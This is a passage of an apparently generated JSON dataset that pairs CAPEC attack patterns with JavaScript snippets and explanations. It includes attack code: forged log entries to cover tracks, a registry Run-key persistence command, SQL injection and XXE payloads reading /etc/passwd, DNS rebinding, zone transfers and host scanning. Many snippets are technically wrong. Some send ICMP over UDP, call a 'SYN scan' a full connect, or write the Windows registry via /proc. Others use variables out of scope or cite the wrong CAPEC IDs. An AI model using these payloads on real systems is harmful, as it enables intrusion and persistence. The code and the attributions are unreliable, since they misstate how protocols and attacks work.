        "code_snippet": "const fs = require('fs');\nconst logFile = '/var/log/app.log';\n\nfunction logEvent(event) {\n  const logEntry = `${new Date().toISOString()} - ${event}\\n`;\n  fs.appendFileSync(logFile, logEntry);\n}\n\nfunction manipulateLog() {\n  const maliciousEntry = '2023-10-01T00:00:00.000Z - User login failed: admin\\n';\n  fs.appendFileSync(logFile, maliciousEntry);\n}\n\n// Logging a normal event\nlogEvent('User login successful: user123');\n\n// Manipulating the log to cover tracks\nmanipulateLog();",
        "description": "This JavaScript code snippet demonstrates a basic logging mechanism and how it can be manipulated. The `logEvent` function appends a log entry to a log file, while the `manipulateLog` function injects a malicious log entry. This embodies the CAPEC concept of 'Audit Log Manipulation' by showing how an attacker can inject misleading log entries. The code also touches on related CWEs: CWE-117 (Improper Output Neutralization for Logs) by not sanitizing log entries, CWE-532 (Insertion of Sensitive Information into Log File) by potentially logging sensitive information, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by allowing unauthorized log manipulation."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "const fs = require('fs');\nconst registryKey = 'HKEY_LOCAL_MACHINE\\\\Software\\\\MyApp';\nconst sensitiveData = 'password123';\n\n// Insecurely storing sensitive data in the registry\nfs.writeFileSync(`/proc/registry/${registryKey}`, sensitiveData, 'utf8');\n\n// Incomplete documentation of program execution\nfunction executeTask() {\n  // Privilege context switching error\n  process.setuid(0); // Switch to root user\n  // Task execution logic here\n  process.setuid(process.env.USER); // Switch back to original user\n}\n\nexecuteTask();",
        "description": "This JavaScript code snippet demonstrates several security vulnerabilities related to registry manipulation and other related weaknesses. The code insecurely stores sensitive information (a password) in the registry in cleartext (CWE-314). It also includes a function that switches user privileges to root without proper management (CWE-270), which can lead to privilege escalation issues. Additionally, the function lacks proper documentation of its execution flow (CWE-1112), making it difficult to understand and maintain. These issues collectively represent the main idea of the deprecated CAPEC pattern related to registry manipulation and associated weaknesses."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "const { exec } = require('child_process');\nconst registryKey = 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\MaliciousApp';\nconst command = `reg add ${registryKey} /v MaliciousApp /t REG_SZ /d \"C:\\\\Path\\\\To\\\\MaliciousApp.exe\" /f`;\n\nexec(command, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error: ${error.message}`);\n    return;\n  }\n  if (stderr) {\n    console.error(`Stderr: ${stderr}`);\n    return;\n  }\n  console.log(`Stdout: ${stdout}`);\n});",
        "description": "This JavaScript code snippet demonstrates how an adversary can add a new entry to the Windows registry 'run keys' to ensure that a malicious application is executed every time a user logs in. The 'exec' function from the 'child_process' module is used to run a command that adds a registry key under 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'. This key points to the executable of the malicious application, ensuring it runs with the user's permissions upon login. This embodies the CAPEC idea of 'Modification of Registry Run Keys' and touches on related CWEs such as 'External Control of System or Configuration Setting' and 'Cleartext Storage in the Registry'."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst app = express();\n\n// Load schema from a file\nlet schema = JSON.parse(fs.readFileSync('schema.json', 'utf8'));\n\napp.post('/updateSchema', (req, res) => {\n  // External control of system setting (CWE-15)\n  schema = req.body.newSchema;\n  fs.writeFileSync('schema.json', JSON.stringify(schema));\n  res.send('Schema updated');\n});\n\napp.post('/submitData', (req, res) => {\n  // Trust boundary violation (CWE-501)\n  const data = req.body;\n  if (validateDataAgainstSchema(data, schema)) {\n    // Process data\n    res.send('Data accepted');\n  } else {\n    res.status(400).send('Invalid data');\n  }\n});\n\nfunction validateDataAgainstSchema(data, schema) {\n  // Simple validation logic\n  for (let key in schema) {\n    if (!data.hasOwnProperty(key)) {\n      return false;\n    }\n  }\n  return true;\n}\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js application that is vulnerable to schema poisoning. The application loads a schema from a file and allows external users to update this schema via the '/updateSchema' endpoint. This represents CWE-15 (External Control of System or Configuration Setting) as it allows users to control the schema. The '/submitData' endpoint processes data submissions and validates them against the potentially poisoned schema, representing CWE-501 (Trust Boundary Violation) as it mixes trusted and untrusted data. The code highlights the risk of allowing external control over critical configuration settings, which can lead to security vulnerabilities such as denial of service or improper data handling."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    // CWE-301: Reflection Attack in an Authentication Protocol\n    client.write('AUTH user:password');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // CWE-294: Authentication Bypass by Capture-replay\n    if (data.toString() === 'AUTH_SUCCESS') {\n        client.write('REPLAY_AUTH user:password');\n    }\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    if (data.toString().includes('INTEGRITY_CHECK')) {\n        client.write('MODIFIED_MESSAGE');\n    }\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and performs several actions that embody the concept of 'Protocol Manipulation' as described in the CAPEC. The client sends an authentication message ('AUTH user:password') to the server, which is vulnerable to a reflection attack (CWE-301). Upon receiving an 'AUTH_SUCCESS' message, the client replays the authentication message (CWE-294), demonstrating a capture-replay attack. Additionally, the client sends a modified message when it detects an 'INTEGRITY_CHECK' message from the server, illustrating improper enforcement of message integrity during transmission (CWE-924). This code highlights how an adversary can manipulate a communication protocol to perform various attacks, including impersonation and message tampering."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk;\n  });\n  req.on('end', () => {\n    // Vulnerable to HTTP Response Smuggling\n    if (body.includes('Content-Length:')) {\n      res.writeHead(200, { 'Content-Type': 'text/plain' });\n      res.end('HTTP/1.1 200 OK\\r\\nContent-Length: 13\\r\\n\\r\\nHello, World!\\r\\nHTTP/1.1 200 OK\\r\\nContent-Length: 13\\r\\n\\r\\nHello, World!');\n    } else {\n      res.writeHead(200, { 'Content-Type': 'text/plain' });\n      res.end('Hello, World!');\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js that is vulnerable to HTTP Response Smuggling. The server listens for incoming requests and reads the request body. If the body contains the string 'Content-Length:', it sends a crafted HTTP response that includes two HTTP responses in one. This demonstrates CWE-113 (HTTP Response Splitting) by not properly neutralizing CRLF sequences, leading to CWE-444 (HTTP Request/Response Smuggling). The code also touches on CWE-74 (Improper Neutralization of Special Elements) by not sanitizing the input properly, and CWE-436 (Interpretation Conflict) by potentially causing different interpretations between client and server."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // Check for GET method to access sensitive data\n  if (req.method === 'GET') {\n    // Sensitive data exposed via GET request\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Sensitive Data: User Passwords');\n  } else {\n    // Deny access for other HTTP methods\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access Denied');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://127.0.0.1:3000/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server checks if the incoming request uses the GET method to access sensitive data. If the request method is GET, it responds with sensitive data (e.g., user passwords). For any other HTTP method, it denies access by returning a 403 status code. This code demonstrates the vulnerability described in the CAPEC by relying on a single HTTP verb (GET) to grant access to sensitive information, which can be exploited by an attacker using HTTP Verb Tampering. The related CWEs are illustrated by the improper use of GET requests for sensitive data (CWE-598) and the reliance on a single factor (HTTP verb) for access control (CWE-654)."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst server = http.createServer((req, res) => {\n  const targetHost = 'malicious.example.com';\n  dns.resolve4(targetHost, (err, addresses) => {\n    if (err) throw err;\n    const initialIP = addresses[0];\n    console.log(`Initial IP: ${initialIP}`);\n\n    // Simulate delay and DNS rebinding\n    setTimeout(() => {\n      dns.resolve4(targetHost, (err, newAddresses) => {\n        if (err) throw err;\n        const reboundIP = newAddresses[0];\n        console.log(`Rebound IP: ${reboundIP}`);\n\n        // Make a request to the internal IP\n        http.get(`http://${reboundIP}`, (internalRes) => {\n          let data = '';\n          internalRes.on('data', (chunk) => {\n            data += chunk;\n          });\n          internalRes.on('end', () => {\n            res.writeHead(200, {'Content-Type': 'text/plain'});\n            res.end(`Internal Data: ${data}`);\n          });\n        }).on('error', (e) => {\n          console.error(`Got error: ${e.message}`);\n        });\n      });\n    }, 5000); // Delay to simulate DNS rebinding\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server running at http://0.0.0.0:8080/');\n});",
        "description": "This JavaScript code snippet demonstrates a DNS rebinding attack. The server initially resolves the IP address of a malicious domain ('malicious.example.com'). After a delay, it resolves the domain again to simulate DNS rebinding, which changes the IP address to an internal IP address within the target organization. The server then makes an HTTP request to this internal IP address and returns the data to the client. This code embodies the main idea of CAPEC-111 (DNS Rebinding) and incorporates CWE-1327 (Binding to an Unrestricted IP Address) by binding the server to '0.0.0.0', making it accessible from any network interface."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    client.write('AUTH username:password');\n});\n\nclient.on('data', (data) => {\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    if (data.toString() === 'AUTH_SUCCESS') {\n        console.log('Authentication successful');\n    } else {\n        console.log('Authentication failed');\n    }\n    client.destroy();\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});\n\n// CWE-707: Improper Neutralization\nfunction processData(input) {\n    // Assume input is well-formed without validation\n    console.log('Processing:', input);\n}\n\n// CWE-1292: Incorrect Conversion of Security Identifiers\nfunction convertSecurityIdentifier(signal) {\n    // Incorrect conversion logic\n    return signal === 'secure' ? 'trusted' : 'untrusted';\n}\n\n// CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\nfunction activateDebugMode() {\n    console.log('Debug mode activated');\n    // Potentially dangerous operation\n}\n\n// Simulate receiving a signal\nconst signal = 'secure';\nconst securityIdentifier = convertSecurityIdentifier(signal);\nconsole.log('Security Identifier:', securityIdentifier);\n\n// Simulate processing data\nprocessData('Sensitive data');\n\n// Simulate activating debug mode\nactivateDebugMode();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to inter-component protocol manipulation. It establishes a TCP connection and transmits sensitive authentication information in cleartext (CWE-319). It also fails to ensure message integrity during transmission (CWE-924). The processData function assumes input is well-formed without validation (CWE-707). The convertSecurityIdentifier function incorrectly converts security signals, potentially allowing unauthorized access (CWE-1292). Finally, the activateDebugMode function simulates the activation of debug logic at runtime, which can alter system behavior (CWE-1313). This code embodies the main idea of CAPEC by showcasing how improper handling of inter-component protocols can lead to various security issues."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "const xml2js = require('xml2js');\nconst fs = require('fs');\n\n// Read XML data from a file\nfs.readFile('data.xml', 'utf8', (err, data) => {\n  if (err) throw err;\n\n  // Parse the XML data\n  xml2js.parseString(data, (err, result) => {\n    if (err) throw err;\n\n    // Assume the 'user' field is immutable and use it for authentication\n    const user = result.user;\n    if (user === 'admin') {\n      console.log('Authenticated as admin');\n    } else {\n      console.log('Authentication failed');\n    }\n  });\n});",
        "description": "This JavaScript code snippet reads and parses an XML file using the 'xml2js' library. It then extracts the 'user' field from the parsed XML data and uses it for authentication. The code assumes that the 'user' field is immutable and directly uses it to authenticate the user as 'admin'. This represents the CAPEC of 'Data Interchange Protocol Manipulation' by demonstrating how an attacker could manipulate the XML data to impersonate an admin. The code also embodies several related CWEs: CWE-707 (Improper Neutralization) by not validating the XML structure, CWE-302 (Authentication Bypass by Assumed-Immutable Data) by assuming the 'user' field is immutable, and CWE-201 (Insertion of Sensitive Information Into Sent Data) by potentially exposing sensitive authentication logic."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/api/data',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log('Response:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\n// Manipulating the request body to include unexpected values\nconst maliciousPayload = JSON.stringify({\n  userId: '1 OR 1=1', // SQL Injection\n  action: 'delete',\n  target: 'all'\n});\n\nreq.write(maliciousPayload);\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a web service protocol manipulation attack. The code creates an HTTP POST request to a web service endpoint '/api/data' on 'example.com'. The request body is manipulated to include a malicious payload with an SQL injection attempt ('1 OR 1=1') and an action to delete all targets. This embodies the CAPEC idea of manipulating web service protocols to cause unintended behavior, such as unauthorized data access or service disruption. The code also touches on related CWEs like improper neutralization (CWE-707) by not sanitizing input, and client-side enforcement of server-side security (CWE-602) by relying on the client to send a well-formed request."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "const soap = require('soap');\nconst url = 'http://example.com/soap?wsdl';\nconst args = { username: 'admin', password: 'password' };\n\nsoap.createClient(url, function(err, client) {\n  if (err) throw err;\n  client.login(args, function(err, result) {\n    if (err) throw err;\n    console.log(result);\n  });\n});\n\n// SOAP message manipulation\nconst manipulatedArgs = { username: 'admin', password: 'password', extraParam: '<!ENTITY xxe SYSTEM \"file:///etc/passwd\">' };\nclient.login(manipulatedArgs, function(err, result) {\n  if (err) throw err;\n  console.log(result);\n});",
        "description": "This JavaScript code snippet demonstrates a SOAP client that interacts with a SOAP web service. The code first creates a SOAP client and sends a login request with valid credentials. Then, it shows how an attacker might manipulate the SOAP message by adding an extra parameter that includes an XML External Entity (XXE) attack payload. This manipulation can exploit vulnerabilities such as CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-707 (Improper Neutralization). The code highlights the potential for SOAP message manipulation, which can lead to various security issues on the server side."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "const soap = require('soap');\nconst url = 'http://example.com/service?wsdl';\n\n// Exposing WSDL file containing sensitive information\nsoap.createClient(url, function(err, client) {\n  if (err) throw err;\n  // Capture-replay vulnerability\n  const message = '<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservice\">\n    <soapenv:Header/>\n    <soapenv:Body>\n      <web:Authenticate>\n        <web:username>admin</web:username>\n        <web:password>password</web:password>\n      </web:Authenticate>\n    </soapenv:Body>\n  </soapenv:Envelope>';\n\n  client.MyFunction(message, function(err, result) {\n    if (err) throw err;\n    console.log(result);\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a SOAP client interacting with a web service by exposing a WSDL file that contains sensitive information. The code creates a SOAP client using the WSDL URL and sends an authentication message. This message can be captured and replayed by an attacker to bypass authentication, illustrating a capture-replay vulnerability. The code highlights the risks associated with exposing WSDL files and the potential for authentication bypass through replay attacks."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('Ping');\nconst targetHost = '192.168.1.1';\nconst targetPort = 7; // Echo Protocol\n\nclient.send(message, 0, message.length, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending message:', err);\n    client.close();\n    return;\n  }\n  console.log('Ping message sent to', targetHost);\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received response from ${rinfo.address}:${rinfo.port} - ${msg}`);\n  client.close();\n});",
        "description": "This JavaScript code snippet uses the 'dgram' module to create a UDP client that sends an ICMP Echo Request (Ping) to a target host. The target host is specified by the 'targetHost' variable, and the message 'Ping' is sent to the Echo Protocol port (port 7). If the target host is responsive, it will send back an ICMP Echo Reply, which is logged to the console. This code demonstrates the concept of an ICMP Echo Request Ping (CAPEC-200), which can be used to determine if a target system is responsive. The code also touches on CWE-200 (Exposure of Sensitive Information) as it can reveal the presence of a host, and CWE-319 (Cleartext Transmission of Sensitive Information) since the ping message is sent in cleartext."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "const net = require('net');\n\nconst targetHost = '192.168.1.1';\nconst targetPort = 80;\n\nconst socket = new net.Socket();\n\nsocket.connect(targetPort, targetHost, () => {\n  console.log(`Connected to ${targetHost}:${targetPort}`);\n  socket.write('GET / HTTP/1.1\\r\\nHost: ' + targetHost + '\\r\\n\\r\\n');\n});\n\nsocket.on('data', (data) => {\n  console.log('Received data:', data.toString());\n  socket.destroy();\n});\n\nsocket.on('error', (err) => {\n  console.error('Connection error:', err.message);\n});\n\nsocket.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a basic TCP connection to a target host and port, which can be used to perform a SYN scan. The code attempts to connect to a specified IP address and port, sending a simple HTTP GET request if the connection is successful. This embodies the main idea of a TCP SYN scan by attempting to establish a connection to determine the status of the port. The code also includes handling for receiving data, errors, and connection closure. The related CWEs are represented in the context of potential vulnerabilities such as exposure of sensitive information (CWE-200), cleartext transmission (CWE-319), and excessive attack surface (CWE-1125)."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst server = http.createServer((req, res) => {\n  if (req.method === 'POST' && req.url === '/login') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const { username, password } = JSON.parse(body);\n      const hashedPassword = crypto.createHash('sha256').update(password).digest('hex');\n      // Simulate a database check\n      if (username === 'admin' && hashedPassword === '5e884898da28047151d0e56f8dc6292773603d0d6aabbddc8a1d6e5b4e6e6e6e') {\n        const token = crypto.randomBytes(16).toString('hex');\n        res.writeHead(200, { 'Content-Type': 'application/json' });\n        res.end(JSON.stringify({ token }));\n      } else {\n        res.writeHead(401, { 'Content-Type': 'application/json' });\n        res.end(JSON.stringify({ error: 'Invalid credentials' }));\n      }\n    });\n  } else if (req.method === 'GET' && req.url.startsWith('/data')) {\n    const token = req.headers['authorization'];\n    if (token) {\n      // Simulate token validation\n      if (token === 'valid-token') {\n        res.writeHead(200, { 'Content-Type': 'application/json' });\n        res.end(JSON.stringify({ data: 'Sensitive data' }));\n      } else {\n        res.writeHead(403, { 'Content-Type': 'application/json' });\n        res.end(JSON.stringify({ error: 'Invalid token' }));\n      }\n    } else {\n      res.writeHead(401, { 'Content-Type': 'application/json' });\n      res.end(JSON.stringify({ error: 'No token provided' }));\n    }\n  } else {\n    res.writeHead(404, { 'Content-Type': 'application/json' });\n    res.end(JSON.stringify({ error: 'Not found' }));\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that handles login and data retrieval requests. The login endpoint (/login) accepts a username and password, hashes the password, and checks it against a hardcoded value. If the credentials are valid, it returns a token. The data endpoint (/data) checks for a valid token in the authorization header before returning sensitive data. This code is vulnerable to capture-replay attacks (CWE-294) because it does not use any mechanism to prevent replaying of the token. An attacker could capture a valid token and reuse it to access sensitive data. Additionally, the code does not handle synchronization issues (CWE-373) or check for the existence of API functions across different environments (CWE-589), which could lead to further vulnerabilities."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Middleware to simulate non-transparent sharing of resources\napp.use((req, res, next) => {\n  if (req.headers['x-shared-resource']) {\n    // Simulate access to a shared resource that should be isolated\n    req.sharedResource = 'Sensitive Data';\n  }\n  next();\n});\n\n// Route that bypasses authentication\napp.get('/bypass-auth', (req, res) => {\n  if (req.query.token === 'valid-token') {\n    res.send('Authenticated Access');\n  } else {\n    res.send('Access Denied');\n  }\n});\n\n// Route that demonstrates creation of an emergent resource\napp.get('/create-resource', (req, res) => {\n  if (req.query.create === 'true') {\n    global.emergentResource = 'New Resource';\n    res.send('Emergent Resource Created');\n  } else {\n    res.send('No Resource Created');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}/`);\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that demonstrates several security weaknesses related to the deprecated CAPEC and CWEs. The middleware simulates non-transparent sharing of resources by checking for a specific header and attaching sensitive data to the request object, representing CWE-1303. The '/bypass-auth' route demonstrates an authentication bypass issue (CWE-287) by allowing access based on a query parameter token. The '/create-resource' route shows the creation of an emergent resource (CWE-1229) by conditionally creating a global variable based on a query parameter. This code embodies the main idea of infrastructure-based footprinting by exposing potential vulnerabilities in resource management and access control."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "const dns = require('dns');\n\nfunction enumerateMXRecords(domain) {\n  dns.resolveMx(domain, (err, addresses) => {\n    if (err) {\n      console.error('Error resolving MX records:', err);\n      return;\n    }\n    addresses.forEach(record => {\n      console.log(`MX Record: ${record.exchange} with priority ${record.priority}`);\n    });\n  });\n}\n\nenumerateMXRecords('example.com');",
        "description": "This JavaScript code snippet demonstrates how to enumerate MX (Mail Exchange) records for a given domain using Node.js's 'dns' module. The function 'enumerateMXRecords' takes a domain name as input and performs a DNS query to retrieve the MX records. The retrieved records are then printed to the console, showing the mail server addresses and their priorities. This process embodies the main idea of the CAPEC by gathering information about the mail servers of a target domain, which could potentially reveal sensitive information such as the IP address of the firewall or other internal systems. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) and relying on DNS resolution (CWE-350)."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "const dns = require('dns');\n\nfunction performZoneTransfer(domain) {\n  dns.resolveNs(domain, (err, nameservers) => {\n    if (err) {\n      console.error('Error resolving nameservers:', err);\n      return;\n    }\n\n    nameservers.forEach(ns => {\n      const zoneTransferCommand = `dig @${ns} ${domain} AXFR`;\n      const exec = require('child_process').exec;\n\n      exec(zoneTransferCommand, (error, stdout, stderr) => {\n        if (error) {\n          console.error(`Error executing zone transfer: ${error.message}`);\n          return;\n        }\n\n        if (stderr) {\n          console.error(`Zone transfer stderr: ${stderr}`);\n          return;\n        }\n\n        console.log(`Zone transfer result for ${domain} from ${ns}:\n${stdout}`);\n      });\n    });\n  });\n}\n\nperformZoneTransfer('example.com');",
        "description": "This JavaScript code snippet demonstrates how an attacker might attempt a DNS Zone Transfer to gather sensitive information about a target domain. The `performZoneTransfer` function first resolves the nameservers for the given domain using the `dns.resolveNs` method. For each nameserver, it constructs a command to perform a DNS Zone Transfer using the `dig` tool and executes it using Node.js's `child_process.exec` method. If the zone transfer is successful, it prints the result, which may include sensitive information about the domain's internal network topology. This code embodies the main idea of CAPEC-200, where an attacker exploits a DNS misconfiguration to obtain sensitive information. The related CWEs highlight the risks of exposing sensitive information (CWE-200) and the potential misuse of DNS information in security decisions (CWE-350)."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "const net = require('net');\nconst ips = ['192.168.1.1', '192.168.1.2', '192.168.1.3']; // Example IP range\n\nips.forEach(ip => {\n  const client = new net.Socket();\n  client.setTimeout(1000);\n  client.connect(80, ip, () => {\n    console.log(`Host ${ip} is alive`);\n    client.destroy();\n  });\n  client.on('error', () => {\n    console.log(`Host ${ip} is not responding`);\n  });\n  client.on('timeout', () => {\n    console.log(`Host ${ip} timed out`);\n    client.destroy();\n  });\n});",
        "description": "This JavaScript code snippet performs a basic host discovery (ping sweep) by attempting to establish a TCP connection to port 80 on a range of IP addresses. It uses the 'net' module to create a socket and connect to each IP address in the list. If a connection is successful, it logs that the host is alive; otherwise, it logs that the host is not responding or has timed out. This code embodies the main idea of CAPEC-292 (Host Discovery) by probing a range of IP addresses to determine if hosts are alive. The code also touches on related CWEs: it could expose sensitive information (CWE-200) if the IP range is sensitive, and it relies on IP addresses for determining host availability (CWE-291)."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "const net = require('net');\n\nfunction traceroute(target) {\n  let ttl = 1;\n  const maxHops = 30;\n  const port = 33434;\n\n  function sendProbe() {\n    const socket = new net.Socket();\n    socket.setTimeout(5000);\n    socket.on('error', (err) => console.log(`Error: ${err.message}`));\n    socket.on('timeout', () => console.log(`TTL ${ttl}: Request timed out`));\n    socket.connect(port, target, () => {\n      console.log(`TTL ${ttl}: Reached ${target}`);\n      socket.destroy();\n    });\n    socket.setTTL(ttl);\n    ttl++;\n    if (ttl <= maxHops) {\n      setTimeout(sendProbe, 1000);\n    }\n  }\n\n  sendProbe();\n}\n\ntraceroute('example.com');",
        "description": "This JavaScript code snippet demonstrates a simple implementation of a traceroute utility using the 'net' module. The function 'traceroute' sends TCP packets to a target host, incrementing the Time-to-Live (TTL) value with each probe. When the TTL expires, an ICMP diagnostic message is generated, revealing the hop where the packet expired. This process helps map out the route data takes through the network to reach the target. The code embodies the main idea of CAPEC-292 (Traceroute Route Enumeration) by illustrating how an adversary could use traceroute to construct a network topology. The related CWEs are represented by the potential exposure of sensitive information (e.g., network topology) to unauthorized actors, improper management of sensitive trace data, and the cleartext transmission of sensitive information."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  if (msg[0] === 17) { // ICMP Type 17 Address Mask Request\n    const response = Buffer.from([18, ...Array(7).fill(0)]); // ICMP Type 18 Address Mask Reply\n    server.send(response, 0, response.length, rinfo.port, rinfo.address, (err) => {\n      if (err) console.error('Error sending response:', err);\n    });\n  }\n});\n\nserver.bind(0, '0.0.0.0'); // CWE-1327: Binding to an Unrestricted IP Address\nconsole.log('Server listening on 0.0.0.0');",
        "description": "This JavaScript code snippet creates a UDP server that listens for incoming ICMP messages. When it receives an ICMP Type 17 Address Mask Request, it responds with an ICMP Type 18 Address Mask Reply. The server binds to the unrestricted IP address 0.0.0.0, which is a security weakness (CWE-1327). This setup can expose sensitive network configuration information (CWE-200) to unauthorized actors, as it does not properly restrict communication channels to intended endpoints (CWE-923). The code demonstrates how an adversary could exploit the ICMP Address Mask Request to gather network information, aligning with the CAPEC description."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.method === 'GET' && req.url.startsWith('/timestamp')) {\n    const timestamp = new Date().toISOString();\n    res.writeHead(200, {'Content-Type': 'application/json'});\n    res.end(JSON.stringify({ timestamp }));\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens for GET requests at the '/timestamp' endpoint and responds with the current timestamp in ISO format. This demonstrates the 'Timestamp Request' attack pattern (CAPEC) by exposing the server's current time. An attacker could use this information to exploit time-based security mechanisms. The code also touches on related CWEs: it exposes sensitive information (CWE-200), uses the GET method with sensitive data (CWE-598), and could potentially be used in timing attacks (CWE-208, CWE-385) or replay attacks (CWE-294)."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  if (msg.toString() === 'ICMP_INFO_REQUEST') {\n    const response = Buffer.from('ICMP_INFO_REPLY');\n    server.send(response, 0, response.length, rinfo.port, rinfo.address, (err) => {\n      if (err) console.error('Error sending response:', err);\n    });\n  }\n});\n\nserver.bind(12345, () => {\n  console.log('Server listening on port 12345');\n});",
        "description": "This JavaScript code snippet creates a UDP server that listens for incoming messages. When it receives a message with the content 'ICMP_INFO_REQUEST', it responds with 'ICMP_INFO_REPLY'. This simulates the behavior of an ICMP Information Request and Reply, which is a deprecated mechanism. The code demonstrates the vulnerability described in CAPEC-Name: 'ICMP Information Request', where an adversary can send an ICMP Information Request to determine if the host responds to this deprecated mechanism. The related CWEs highlight potential issues such as exposure of sensitive information (CWE-200, CWE-497) and cleartext transmission (CWE-319), which are relevant in the context of this deprecated protocol."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "const net = require('net');\n\nfunction sendTcpAckPing(host, port) {\n  const client = new net.Socket();\n  client.connect(port, host, () => {\n    const ackPacket = Buffer.from([0x50]); // ACK flag set\n    client.write(ackPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.includes(Buffer.from([0x14]))) { // RST flag\n      console.log('Host is alive');\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error('Error:', err.message);\n    client.destroy();\n  });\n}\n\nsendTcpAckPing('192.168.1.1', 80);",
